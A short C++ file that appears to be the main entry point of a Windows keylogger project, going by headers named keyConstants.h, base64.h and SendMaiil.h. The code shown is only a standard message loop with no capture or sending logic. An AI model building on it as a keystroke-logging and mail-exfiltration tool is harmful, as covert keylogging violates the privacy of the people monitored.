#include <iostream>
#include <windows.h>

#include "keyConstants.h"
#include "base64.h"
#include "helper.h"
#include "io.h"
//#include "Timer.h"
#include "SendMaiil.h"

using namespace std;

int main()
{
    MSG Msg;

    while(GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return 0;
}
